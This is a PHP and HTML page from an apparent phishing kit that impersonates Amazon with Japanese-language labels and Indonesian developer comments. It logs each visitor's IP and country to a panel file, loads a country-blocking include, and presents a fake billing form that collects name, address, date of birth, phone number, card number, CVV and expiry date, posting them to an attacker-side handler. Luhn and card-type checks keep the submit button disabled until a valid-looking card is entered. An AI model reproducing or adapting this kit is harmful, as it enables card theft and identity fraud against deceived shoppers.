<?php

session_start();
include('../__CONFIG__.php');
include '../bahasa.php';
include '../block_country.php';
include '../Library/ClassFunction/curldataip.php';

$file = fopen('../panel/country.txt', "a");
$time = date('H:i dS F');
fwrite ($file, " IP $showIP Dari $showCountry Mengakses Billing Page\r\n ");
fclose( $file );



   ?>
<!doctype html>
<html lang="en">
   <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <!-- Required meta tags -->
      
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <!-- Bootstrap CSS -->
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="style.css" />
      <link rel="stylesheet" href="../Sheets/mobile.css">
      <link rel="stylesheet" href="../Sheets/accbilling.css">
      <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script type='text/javascript' src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
    <link rel="stylesheet" href="Library/FormValidation/dist/css/formValidation.min.css">
      
   </head>
   <!-- Navbar -->
   <body>
      <nav class="navbar navbar-default">
         <a class="navbar-brand" href="#">
         <img src="http://pngimg.com/uploads/amazon/amazon_PNG11.png" width="90" height="30" alt="">
         </a>
      </nav>
      <div class="a-container">
         <form name="signIn" id="mobilesign" method="post" action="../Actions/paymentmob.php" class="auth-validate-form auth-clearable-form" data-fwcim-id="r8JCGHxQ">
            <div>
               <h1 class="a-spacing-micro a-spacing-top-small a-text-left"> <?php echo $cbmyba; ?></h1>
            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
                <!--ini form buat fullname-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="fullname" placeholder="<?php echo $fnn ?>" name="fullname" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat address 1-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="adressline1" placeholder="<?php echo $sap ?>" name="address1" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat address 2-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="adressline2" placeholder="<?php echo $apsub ?>" name="address2" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat city-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="adressline2" placeholder="<?php echo $ctyy ?>" name="city" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat state-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="city" placeholder="<?php echo $sprr; ?>" name="state" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat zip-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="zipCode" placeholder="<?php echo $zco; ?>" name="zip" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat country-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="country" value="<?php echo $showCountry; ?>" placeholder="<?php echo $conco ?>" name="country" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat birth-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="birth" placeholder="DD/MM/YYYY" name="dob" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini form buat phone-->
               <div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                  <input type="tel" maxlength="1024" id="input-phone" placeholder="<?php echo $panu; ?>" name="phone" tabindex="2">
                  <div class="a-row auth-visible-password-container auth-show-password-empty">
                     <span class="a-size-small a-color-secondary auth-visible-password"></span>
                  </div>
               </div>
               <div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked"> 
            </div>
            <!--ini akhir dari billing -->
            <!--ini bagian credit card-->
            <h1 class="a-spacing-micro a-spacing-top-small a-text-left"> <?php echo $cypm; ?></h1>
            <!--ini fullname-->
            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
            <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="text" maxlength="128" id="nameoncard" placeholder="<?php echo $chn ?>" name="nameoncard" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini buat cc-->
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="tel" maxlength="128" id="id_xccaaa" placeholder="カード番号" name="ncn" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <!--ini cvv-->
               <div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                  <input type="text" class="form-control amazoninput" name="cxxs" id="xc" placeholder="CVV/CVV2" maxlength="4" required>
                  <div class="a-row auth-visible-password-container auth-show-password-empty">
                     <span class="a-size-small a-color-secondary auth-visible-password"></span>
                  </div>
               </div>
               <div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked"> 
            </div>
            </div>
            <!-- ini date cc -->
                        <div class="col-sm-6">
                                    <div class="row">
                                        <div class="col-6">
                                            <div class="form-group">
                                                <label for="months"></label>
                                                <select class="form-control bgcolored2" name="month" id="months" required="required">
                                                    <option>01</option>
                                                    <option>02</option>
                                                    <option>03</option>
                                                    <option>04</option>
                                                    <option>05</option>
                                                    <option>06</option>
                                                    <option>07</option>
                                                    <option>08</option>
                                                    <option>09</option>
                                                    <option>10</option>
                                                    <option>11</option>
                                                    <option>12</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-6">
                                            <div class="form-group">
                                                <label for="months"></label>
                                                <select class="form-control bgcolored2" name="year" id="months" required="required">
                                                    <option value="<?php  echo date("Y");?>" selected="">
                  <?php  echo date("Y");?>
                </option>
				<option value="<?php  echo date("Y")+1;?>">
                  <?php  echo date("Y")+1;?>
                </option>
				<option value="<?php  echo date("Y")+2;?>">
                  <?php  echo date("Y")+2;?>
                </option>
				<option value="<?php  echo date("Y")+3;?>">
                  <?php  echo date("Y")+3;?>
                </option>
				<option value="<?php  echo date("Y")+4;?>">
                  <?php  echo date("Y")+4;?>
                </option>
				<option value="<?php  echo date("Y")+5;?>">
                  <?php  echo date("Y")+5;?>
                </option>
				<option value="<?php  echo date("Y")+6;?>">
                  <?php  echo date("Y")+6;?>
                </option>
				<option value="<?php  echo date("Y")+7;?>">
                  <?php  echo date("Y")+7;?>
                </option>
				<option value="<?php  echo date("Y")+8;?>">
                  <?php  echo date("Y")+8;?>
                </option>
				<option value="<?php  echo date("Y")+9;?>">
                  <?php  echo date("Y")+9;?>
                </option>
				<option value="<?php  echo date("Y")+10;?>">
                  <?php  echo date("Y")+10;?>
                </option>
				<option value="<?php  echo date("Y")+11;?>">
                  <?php  echo date("Y")+11;?>
                </option>
				<option value="<?php  echo date("Y")+12;?>">
                  <?php  echo date("Y")+12;?>
                </option>
				<option value="<?php  echo date("Y")+13;?>">
                  <?php  echo date("Y")+13;?>
                </option>
				<option value="<?php  echo date("Y")+14;?>">
                  <?php  echo date("Y")+14;?>
                </option>
				<option value="<?php  echo date("Y")+15;?>">
                  <?php  echo date("Y")+15;?>
                </option>
				<option value="<?php  echo date("Y")+16;?>">
                  <?php  echo date("Y")+16;?>
                </option>
				<option value="<?php  echo date("Y")+17;?>">
                  <?php  echo date("Y")+17;?>
                </option>
				<option value="<?php  echo date("Y")+18;?>">
                  <?php  echo date("Y")+18;?>
                </option>
				<option value="<?php  echo date("Y")+19;?>">
                  <?php  echo date("Y")+19;?>
                </option>
                                                </select>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <tr>
                                </tr>
            <!--akhir dari credit card-->
            <div class="a-section">
                     <div class="a-button-stack">
                        <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-share-credential-off"><span class="a-button-inner"><input id="signInSubmit" tabindex="6" class="a-button-input" type="submit" name="sex" aria-labelledby="auth-signin-button-announce" disabled="disabled"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                        ログイン
                        </span></span></span>
                        </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </form>
      </div>
      
      
    <script src="../Library/Cleave/dist/cleave.js"></script>
    <script src="../Library/Cleave/dist/addons/cleave-phone.i18n.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>
    <script src="../Library/FormValidation/dist/js/FormValidation.min.js"></script>
    <script src="../Library/FormValidation/dist/js/plugins/Bootstrap.min.js"></script>
    
    <script>
    document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('mobilesign'),
        {
            fields: {
                fullName: {
                    validators: {
                        notEmpty: {
                            message: 'The full name is required'
                        }
                    }
                },
                nameoncard: {
                    validators: {
                        notEmpty: {
                            message: 'The full name is required'
                        }
                    }
                },
            },
            plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                bootstrap: new FormValidation.plugins.Bootstrap(),
                submitButton: new FormValidation.plugins.SubmitButton(),
                icon: new FormValidation.plugins.Icon({
                    valid: 'fa fa-check',
                    invalid: 'fa fa-times',
                    validating: 'fa fa-refresh'
                }),
            },
        }
    );
});
</script>
    
    
    
    <!--this For date-->
    <script>
        new Cleave('#birth', {
                date: true,
                datePattern: ['d', 'm', 'Y']
        });
        new Cleave('#id_xccaaa', {
            creditCard: true,
        })
        new Cleave('#input-phone', {
            phone: true,
            phoneRegionCode: 'JP'
        });
    </script>
    <script>
    var acceptedCreditCards = {
  visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
  mastercard: /^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$/,
  amex: /^3[47][0-9]{13}$/,
  discover: /^65[4-9][0-9]{13}|64[4-9][0-9]{13}|6011[0-9]{12}|(622(?:12[6-9]|1[3-9][0-9]|[2-8][0-9][0-9]|9[01][0-9]|92[0-5])[0-9]{10})$/,
  diners_club: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
  jcb: /^(?:2131|1800|35[0-9]{3})[0-9]{11}$/,
};

$('input[id="id_xccaaa"], input[id="xc"]').on('input', function(){
  if (validateCard($('input[id="id_xccaaa"]').val()) && validateCVV($('input[id="id_xccaaa"]').val(), $('input[id="xc"]').val())) {
    $('input[type="submit"]').prop('disabled', false);
  } else {
    $('input[type="submit"]').prop('disabled', true);
  }
});

function validateCard(value) {
  // remove all non digit characters
  var value = value.replace(/\D/g, '');
  var sum = 0;
  var shouldDouble = false;
  // loop through values starting at the rightmost side
  for (var i = value.length - 1; i >= 0; i--) {
    var digit = parseInt(value.charAt(i));

    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }
  
  var valid = (sum % 10) == 0;
  var accepted = false;
  
  // loop through the keys (visa, mastercard, amex, etc.)
  Object.keys(acceptedCreditCards).forEach(function(key) {
    var regex = acceptedCreditCards[key];
    if (regex.test(value)) {
      accepted = true;
    }
  });
  
  return valid && accepted;
}


function validateCVV(creditCard, cvv) {
  // remove all non digit characters
  var creditCard = creditCard.replace(/\D/g, '');
  var cvv = cvv.replace(/\D/g, '');
  // american express and cvv is 4 digits
  if ((acceptedCreditCards.amex).test(creditCard)) {
    if((/^\d{4}$/).test(cvv))
      return true;
  } else if ((/^\d{3}$/).test(cvv)) { // other card & cvv is 3 digits
    return true;
  }
  return false;
}
</script>
   </body>
</html>